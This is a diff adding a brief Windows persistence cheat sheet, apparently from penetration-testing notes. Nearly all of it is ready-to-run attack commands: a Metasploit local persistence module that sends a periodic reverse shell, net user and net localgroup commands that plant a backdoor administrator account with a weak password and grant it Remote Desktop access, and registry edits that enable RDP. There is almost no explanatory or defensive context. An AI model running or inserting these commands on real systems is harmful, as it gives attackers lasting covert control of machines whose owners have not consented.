@@ -1,0 +1,21 @@
+# Persistence on Windows
+
+
+# Metasploit periodic reverse shell 
+use exploit/windows/local/persistence
+;; this module will send a payload every 10 seconds in default however you can set this time to anything you want
+set session <session-id>
+
+# Adding an RDP administrative account
+
+## Add an administrative remote desktop enabled account
+net user /add joe password1
+net localgroup administrators joe /add
+net localgroup "Remote Desktop Users" joe /add
+
+
+# Enable RDP
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# Disable RDP (if needed)
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
